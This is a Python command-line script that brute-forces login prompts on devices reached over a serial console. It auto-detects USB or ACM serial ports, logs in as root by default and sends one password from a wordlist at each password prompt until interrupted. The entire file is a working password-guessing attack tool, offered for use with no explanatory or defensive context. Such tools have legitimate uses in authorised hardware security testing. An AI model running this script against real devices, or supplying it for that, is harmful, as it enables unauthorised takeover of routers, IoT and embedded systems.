#! /usr/bin/env python3
import serial
import sys
from glob import glob
from select import select
import argparse
 
def Identify_Serial_Ports():
    """Searches a nix system for serial tty devices
       First serial tty device found is returned as string
       searches for /dev/ttyACM* and /dev/ttyUSB*"""

    serialPort = 0
    devices  = ["/dev/ttyACM*", "/dev/ttyUSB*"]
    
    for device in devices:
        scan = glob(device)
        if not scan:
            print("[!] Unable To Locate Any" + device + " Serial ports/devices")
        else:
            serialPort = scan[0]
            print("[+] Serial Port/Device Identified " + str(serialPort))
            return serialPort

    print("[-] No Serial Port/Device Found")
    return 0


def Load_Password_List(pwList):
    """Read a file containing passwords per line into
    a python list. Return list of passwords"""

    passwords = []
    try:
        print("[+] Loading Password List", flush=True, end="")
        c = 0
        for pw in pwList:
            passwords.append(pw)
            c += 1
            if c % 100000 == 0:    # Print a '.' for every 100,000 words
                print("", flush=True, end=".")
    except IOError:
        print("[-] ERROR: Check Password List File")
        return 0
    finally:
        pwList.close()
    print("\n[+] Password List Loaded")
    return passwords

 
def Start_Serial_Connection(serialPort, baudRate, serialParity, serialStopBits, serialByteSize, serialTimeout):
    #serialCtx = serial.Serial(port=serport,baudrate=rate,parity=serial.PARITY_NONE,stopbits=serial.STOPBITS_ONE,bytesize=serial.EIGHTBITS,timeout=1)
    try:
        serialCtx = serial.Serial(port=serialPort, baudrate=baudRate, parity=serialParity, \
                stopbits=serialStopBits, bytesize=serialByteSize, timeout=serialTimeout)
        print("[+] Connected to: " + serialCtx.portstr)
 
    except:
        print("[-] ERROR")
        return 0
    return serialCtx

def Serial_Stream_Reader(user, loginPromptMatch, passwordPromptMatch, passwords, serialCtx):
    pi = 0    #Password Index/Counter
    loginPromptMatch = loginPromptMatch.replace("'", "")
    user = user.replace("'", "")
    passwordPromptMatch = passwordPromptMatch.replace("'", "")
    while True:
      try:
          line = serialCtx.readline()
          if line:
            print (line.decode()),
            if loginPromptMatch in line.decode():
                serialCtx.write((user + "\r").encode())
            if passwordPromptMatch in line.decode():
                print("[+] testing password: " + passwords[pi])
                serialCtx.write((passwords[pi] + "\r").encode())
                pi += 1
      except KeyboardInterrupt:
        serialCtx.close()
        return 1
      except:
        pass
      while sys.stdin in select([sys.stdin], [], [], 0)[0]:
        line = sys.stdin.readline()
        line = line.replace("\n","\r\n")
        serialCtx.write(line.encode())
    
def main():
    parser = argparse.ArgumentParser(description='Brute Force Serial Connection Device Login/Password Prompt')
    parser.add_argument('-w', type=argparse.FileType('r', encoding="ISO-8859-1"), required=True, help='path to file containing wordlist')
    parser.add_argument('-u', type=ascii, required=False, help='user to login as (default=root)', default='root')
    parser.add_argument('--login-prompt', type=ascii, required=True, help='Login Prompt to Match on')
    parser.add_argument('--password-prompt', type=ascii, required=True, help='Password Prompt to Match on')
    parser.add_argument('--serial-port', required=False, help='Serial Port to use. Will auto find port if argument not specificed')
    parser.add_argument('--baud-rate', type=int, required=False, help='Serial Baud Rate (default=115200)', default=115200)
    parser.add_argument('--serial-parity', required=False, help='Serial Parity (default=NONE)', default=serial.PARITY_NONE, choices=[serial.PARITY_EVEN, serial.PARITY_MARK, serial.PARITY_NAMES, serial.PARITY_NONE, serial.PARITY_ODD, serial.PARITY_SPACE])
    parser.add_argument('--serial-stopbits', required=False, help='Serial Stop Bits (default=1', default=serial.STOPBITS_ONE, choices=[serial.STOPBITS_ONE, serial.STOPBITS_ONE_POINT_FIVE, serial.STOPBITS_TWO])
    parser.add_argument('--serial-bytesize', required=False, help='Serial Byte Size (default=8)', default=serial.EIGHTBITS, choices=[serial.EIGHTBITS, serial.FIVEBITS, serial.SEVENBITS, serial.SIXBITS])
    parser.add_argument('--serial-timeout', type=int, required=False, help='Serial Timeout (default=1)', default=1)

    args = parser.parse_args()

    # Call Function to auto find open serial port/device
    if not args.serial_port:
        serialPort = Identify_Serial_Ports()
    else:
        serialPort = args.serial_port
    
    # Read file containing passwords and load into a list of passwords
    passwords = Load_Password_List(args.w)

    # Initialize serial connection
    serialCtx = Start_Serial_Connection(serialPort, args.baud_rate, args.serial_parity, args.serial_stopbits, args.serial_bytesize, args.serial_timeout)
    
    # Start Serial Stream Reader
    ret = Serial_Stream_Reader(args.u, args.login_prompt, args.password_prompt, passwords, serialCtx)


if __name__ == "__main__":
    main()
